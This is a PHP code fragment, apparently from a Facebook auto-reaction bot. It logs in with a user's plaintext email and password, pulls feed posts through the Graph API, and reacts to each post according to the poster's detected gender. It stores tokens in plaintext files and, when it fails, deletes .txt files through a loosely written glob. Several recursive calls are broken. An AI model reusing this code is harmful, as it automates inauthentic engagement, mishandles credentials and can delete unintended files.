	  			if($user_gen == 'female')
			{
				$r_females 	= '/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_female;
				$r_female_e	= $this->fetch_value($html,$r_females,'" style="display:block">');
				$r_female_l	= 'https://mobile.facebook.com/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_female. $r_female_e;
				$rfl = $this->curl($r_female_l);
				if ($rfl){
				echo "Status ID $post_id[1] => $user_gen => reacted \n";
				}
			} else {
				$r_males 	= '/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_male;
				$r_male_e	= $this->fetch_value($html,$r_males,'" style="display:block">');
				$r_male_l	= 'https://mobile.facebook.com/ufi/reaction/?ft_ent_identifier='.$post_id[1].'&reaction_type='.$r_male. $r_male_e;
			 if ( 	$this->curl($r_male_l) ){
				echo "Status ID $post_id[1] => $user_gen => reacted \n";
				}
			}
	}
	
	private function type_rev($gender){
	 if ($gender == 1){
	   return "LIKE";
	 } else if ($gender == 2){  
	   return "LOVE";
	 } else if ($gender == 3){
    return "WOW";
	 } else if ($gender == 4){
	   return "HAHA";
	 } else if ($gender == 7){
	   return "SAD";
	 } else if ($gender == 8){
	   return "ANGRY";
	 } else if ($gender == 11){
	   return "PRIDE";
	 } else if ($gender == 12){
	   return "THANKFUL";
	 } else {
	   return die("Cant Determine $gender Reaction Type");
	 }
	}
	
	private function graph_react($id, $access_token, $type){
   $post_react = "https://graph.beta.facebook.com/v3.2/".$id."/reactions?";
   $curlopt["post"] = array(
   "type"=>$type,
   "method"=>"post",
   "access_token"=>$access_token
   ); 
  $send = $this->curl($post_react, $curlopt);
      if (false !== $send){
      return $send;
      } else {
        return false;
      }
}
	
	public function React($user, $pass, $token, $r_male, $r_female, $max_status, $options)
	{
	  
	  $female_type = $this->type_rev($r_female);
	  $male_type = $this->type_rev($r_male);
	  
	  echo $this->cpu;
	  
	  if (!empty($token) && ctype_alnum($token) && strlen($token) > 150){ 
	  $this->api_graph("extend", $user, $pass, $token);
	  } else if (file_exists("$user.txt")){
	    $token = file_get_contents("$user.txt");
	   } else {
	     $token=$this->api_graph("get", $user, $pass, false);
	   }
	   
		$get_post	= 'https://graph.beta.facebook.com/v3.2/me/home?fields=id,from,comments.field(id,user_likes),likes.limit(0).summary(1)&limit='.$max_status.'&access_token='.$token; 
		$get_post 	= $this->curl($get_post);
		$get_post 	= json_decode($get_post, true);
		if (!isset($get_post["data"])){
		  $rebuild = $this->api_graph("get", $user, $pass, false);
		  echo "Token Expired/ failed. re-building token...\n";
		  if ($rebuild){
		  return React($user, $pass, $token, $r_male, $r_female, $max_status, $options);
		  } else {
		    echo "Failed Rebuilding Token. Removing All Tokens...\n";
		    $dir = __DIR__;
		    array_map('unlink', glob( "$dir*.txt"));
		    return React($user, $pass, $token, $r_male, $r_female, $max_status, $options);
		  }
		}
		
		foreach($get_post['data'] as $data)
		{ 
		$this->curl("https://mobile.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&login_try_number=1", "lsd=AVpI36s1&version=1&ajax=0&width=0&pxr=0&gps=0&dimensions=0&m_ts=1483804348&li=qg5xWAUZXopBIK0ABg1Dtlzt&email=$user&pass=$pass&login=Masuk");
			
			$stat_id	= $data['id'];
			$uid = $data["from"]["id"];
			if ($data["likes"]["summary"]["has_liked"] === false && $data["likes"]["summary"]["can_like"] !== false){
			$user_gen = $this->gender($uid, $token);
			if ($user_gen == 'female'){
			$init=$this->graph_react($data["id"], $token, $female_type);
			} else {
			$init=$this->graph_react($data["id"], $token, $male_type);
			}
			if (false !== $init){
			 echo $data["id"] . " Post Liked\n";
		 }
		 	
		if ($options["like_comments"] !== false){
		  if ( !empty( $data["comments"] )){
		    echo $data["id"] ." Has comments...\n";
        $lcr = $this->lcreplies($token, $data["id"]);
     if ($lcr !== false){
       echo $lcr."\n"; 
     } else {
       echo $data["id"] . " Initialize Comments Failed\n";
     }
		  	  
 }
}	
} //can like
			$this->curl('https://mobile.facebook.com/logout.php');
			sleep(2);
		}
		
 $version = $this->V();
 if (false === $version){
   echo "\n New Version SCRIPT Avaiable \n";
 }
		
	}
	
	
}